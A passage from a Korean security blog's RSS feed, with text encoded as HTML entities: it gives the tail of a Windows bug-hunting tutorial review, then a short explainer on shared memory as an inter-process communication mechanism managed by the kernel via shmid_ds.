&#xBC1C;&#xC0DD;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; ecx&#xB97C; &#xCEE8;&#xD2B8;&#xB864; &#xD560; &#xC218; &#xC788;&#xB294; &#xC704;&#xCE58;&#xB97C; &#xC54C;&#xC544;&#xB0B4;&#xAE30; &#xC704;&#xD568;&#xC785;&#xB2C8;&#xB2E4;.</li></ul></li></ol>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/juntheworld/">juntheworld</category>
      
      <category domain="https://hackyboiz.github.io/tags/pwnable/">pwnable</category>
      
      <category domain="https://hackyboiz.github.io/tags/bughunting/">bughunting</category>
      
      <category domain="https://hackyboiz.github.io/tags/review/">review</category>
      
      
      <comments>https://hackyboiz.github.io/2021/11/07/juntheworld/bughunting-tutorial-review/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[해키피디아] Shared Memory</title>
      <link>https://hackyboiz.github.io/2021/11/05/poosic/shared-memory/</link>
      <guid>https://hackyboiz.github.io/2021/11/05/poosic/shared-memory/</guid>
      <pubDate>Fri, 05 Nov 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xACF5;&amp;#xC720; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;(Shared Memory)&amp;#xB780; &amp;#xC5EC;&amp;#xB7EC; &amp;#xD504;&amp;#xB85C;&amp;#xADF8;&amp;#xB7A8;&amp;#xC5D0;&amp;#xC11C; &amp;#xC91</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xACF5;&#xC720; &#xBA54;&#xBAA8;&#xB9AC;(Shared Memory)&#xB780; &#xC5EC;&#xB7EC; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C; &#xC911;&#xBCF5;&#xC801;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xB294; &#xC790;&#xC6D0; &#xB0AD;&#xBE44;&#xB97C; &#xCD5C;&#xC18C;&#xD654; &#xD558;&#xAE30; &#xC704;&#xD574; &#xC5EC;&#xB7EC; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xB3D9;&#xC2DC;&#xC5D0; &#xC811;&#xADFC; &#xAC00;&#xB2A5;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC744; &#xC124;&#xC815;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC744; &#xB9D0;&#xD569;&#xB2C8;&#xB2E4;. &#xC989;, &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB07C;&#xB9AC; &#xC11C;&#xB85C; &#xD544;&#xC694;&#xD55C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC8FC;&#xACE0; &#xBC1B;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC04; &#xD1B5;&#xC2E0;(IPC,Inter Process Communication) &#xBC29;&#xC2DD;&#xC758; &#xD55C; &#xAC00;&#xC9C0;&#xB85C; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2021/11/05/poosic/shared-memory/image1.png" alt="Untitled.jpg"></p><p>&#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xB4E4;&#xC740; &#xD558;&#xB098;&#xC758; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA70; &#xC774; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB4E4;&#xC740; &#xAC01;&#xAC01;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xB3C5;&#xB9BD;&#xC801;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0;&#xB9CC; &#xACF5;&#xC720; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xB370;&#xC774;&#xD130; &#xBCF5;&#xC0AC; &#xACFC;&#xC815;&#xC774; &#xC0DD;&#xB7B5;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xCC98;&#xB9AC;&#xC18D;&#xB3C4;&#xB3C4; &#xC5EC;&#xB7EC; IPC &#xD1B5;&#xC2E0; &#xC911;&#xC5D0;&#xC11C;&#xB3C4; &#xB6F0;&#xC5B4;&#xB09C; &#xCC98;&#xB9AC;&#xC18D;&#xB3C4;&#xB97C; &#xAC00;&#xC9D1;&#xB2C8;&#xB2E4;.</p><p>&#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xACF5;&#xC720; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC0DD;&#xC131;&#xB418;&#xB294; &#xACFC;&#xC815;&#xC5D0; &#xB300;&#xD574; &#xAC04;&#xB7B5;&#xD788; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xACF5;&#xC720; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; &#xCEE4;&#xB110;&#xC5D0; &#xACF5;&#xC720; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC704;&#xD55C; &#xACF5;&#xAC04; &#xD560;&#xB2F9;&#xC744; &#xC694;&#xCCAD;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xCEE4;&#xB110; &#xCE21;&#xC5D0;&#xC11C; &#xC694;&#xCCAD;&#xD55C; &#xACF5;&#xAC04;&#xC744; &#xD560;&#xB2F9;&#xD574;&#xC8FC;&#xACE0; &#xD574;&#xB2F9; &#xACF5;&#xC720; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; <code>shmid_ds</code>&#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xCEE4;&#xB110; &#xCE21;&#xC5D0;&#xC11C; &#xAD00;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB807;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C4; &#xACF5;&#xC720; &#xBA54;&#xBAA8;&#xB9AC;&#xB294; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC5C6;&#xB2E4;&#xACE0; &#xD574;&#xC11C; &#xD574;&#xC81C;&#xB418;&#xC9C0; &#xC54A;&#xACE0; &#xAE30;&#xAE30; &#xC790;&#xCCB4;&#xB97C; &#xB9AC;&#xBD80;&#xD305;&#xD558;&#xAC70;&#xB098; &#xC9C1;&#xC811;&#xC801;&#xC73C;&#xB85C; &#xD574;&#xC81C; &#xC694;&#xCCAD;&#xD55C; &#xACBD;&#xC6B0;&#xC5D0;&#xB9CC; &#xD574;&#xC81C;&#xB418;&#xB294; &#xD2B9;&#xC9D5;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Hackypedia/">Hackypedia</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/poosic/">poosic</category>
      
      <category domain="https://hackyboiz.github.io/tags/shared-memory/">shared memory</category>
      
      <category domain="https://hackyboiz.github.io/tags/ipc/">ipc</category>
      
      
      <comments>https://hackyboiz.github.io/2021/11/05/poosic/shared-memory/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
